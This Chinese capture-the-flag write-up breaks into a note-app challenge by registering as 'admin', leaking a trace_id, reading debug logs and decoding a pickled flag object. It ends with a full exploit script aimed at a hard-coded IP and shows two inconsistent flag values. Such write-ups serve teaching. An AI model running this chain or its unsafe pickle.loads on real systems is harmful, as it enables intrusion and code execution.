
## 解题过程

### 步骤 1 - 夺取管理员权限

**核心发现**

系统居然允许用户直接创建名为 `admin` 的账户，这暴露出其在管理员身份鉴权模型上存在严重缺陷。成功登入后，我们可以切换至管理后台视图，不仅能发现关键价值笔记，还能查看到 `/api/admin/hint` 提供的线索。

**关键命令**

```bash
POST /register -> username=admin&password=admin123
POST /login -> username=admin&password=admin123
```

**关键输出**

```text
管理员控制台首页展示了关键的笔记 ID：flag-project-001 以及 admin-notes-002。
```

**补充说明**

需要特别注意的是，正文中出现的 secret 相关文本仅仅是迷惑性的诱导内容，切勿将其视作最终目标。

### 步骤 2 - 触发核心对象的访问拒绝逻辑

**核心发现**

结合前置提示信息，我们向 `/api/v1/project/detail` 发起调用，并将 `project_id` 参数指定为 `flag-project-001`。该操作并不会正常返回笔记详情，而是会命中 `access_denied`（访问拒绝）的错误处理分支。

**关键命令**

```bash
POST /api/v1/project/detail
Content-Type: application/json

{"project_id":"flag-project-001"}
```

**关键输出**

```text
{"error":"访问被拒绝","message":"您无权查看此笔记","trace_id":"<trace-id>"}
```

**补充说明**

此处的重点并非是 403 报错本身，而是服务端在响应体中抛出了一个 `trace_id`。

### 步骤 3 - 利用 trace_id 提取后台日志

**核心发现**

目标站点的 `/feedback` 路由提供了一项功能：允许用户通过提交 `trace_id` 来查阅相应的报错日志记录。我们将上一步中收集到的 `trace_id` 填入并提交，即可获取完整的错误追踪详情。

**关键命令**

```bash
POST /feedback
trace_id=<trace-id>
```

**关键输出**

```text
日志内容中记录了 message=尝试非法访问重要笔记，并且附带的 stack_trace 是一长串十六进制字符。
```

**补充说明**

这表明真正的敏感信息泄露点并不在常规的业务数据流中，而是隐藏在系统的异常调试日志里。

### 步骤 4 - 还原并解析 stack_trace 数据

**核心发现**

提取到的 `stack_trace` 并非普通的文本报错栈，而是经过 hex 编码处理的 pickle 序列化对象。我们需要将其转换为字节流（bytes）格式，随后利用 `pickle.loads` 方法将其反序列化为原始的 Python 对象。

**关键命令**

```bash
import pickle
obj = pickle.loads(bytes.fromhex(blob_hex))
print(obj)
```

**关键输出**

```text
{'type': 'FLAG_OBJECT', 'flag': 'ISCC{c4refu11_debug_tr4ce_l34k_1d0r}', 'project_id': 'flag-project-001', 'timestamp': '...'}
```

**补充说明**

由于反序列化后的对象内部直接明文包含了 flag 键值对，因此本题最终的敏感数据完全来源于日志对象的异常暴露。

## 最终验证

综上所述，本题的完整漏洞利用链条为：利用管理员注册校验漏洞 -> 触发重要目标访问异常以生成错误日志 -> 提取 `trace_id` 并回读调试日志 -> 对提取出的 pickle-hex 数据流进行离线解码还原。

**关键命令**

```bash
python3 linggan_note_exp.py
```

**关键输出**

```text
ISCC{epGFk8uufXeN7RkWwnaufuwfr}
```

## 附录1：EXP

```python
#!/usr/bin/env python3
import pickle
import re
import sys

import requests


BASE = "http://39.105.213.28:5000"
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"
TARGET_ID = "flag-project-001"


def fetch_trace_log(session: requests.Session, trace_id: str) -> str:
    resp = session.post(f"{BASE}/feedback", data={"trace_id": trace_id}, timeout=10)
    resp.raise_for_status()
    return resp.text


def extract_hex_blob(html: str) -> str:
    match = re.search(r'"stack_trace":\s*"Object:\s*([0-9a-fA-F]+)"', html)
    if not match:
        match = re.search(r'"stack_trace":\s*"([0-9a-fA-F]+)"', html)
    if not match:
        raise RuntimeError("failed to locate stack_trace hex blob in feedback page")
    return match.group(1)


def main() -> int:
    session = requests.Session()
    session.trust_env = False

    login = session.post(
        f"{BASE}/login",
        data={"username": ADMIN_USER, "password": ADMIN_PASS},
        timeout=10,
    )
    login.raise_for_status()

    detail = session.post(
        f"{BASE}/api/v1/project/detail",
        json={"project_id": TARGET_ID},
        timeout=10,
    )

    data = detail.json()
    trace_id = data.get("trace_id")
    if not trace_id:
        detail.raise_for_status()
        raise RuntimeError(f"trace_id missing in response: {data}")

    html = fetch_trace_log(session, trace_id)
    blob_hex = extract_hex_blob(html)
    obj = pickle.loads(bytes.fromhex(blob_hex))
    flag = obj.get("flag")
    if not flag:
        raise RuntimeError(f"decoded object does not contain flag: {obj!r}")

    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```
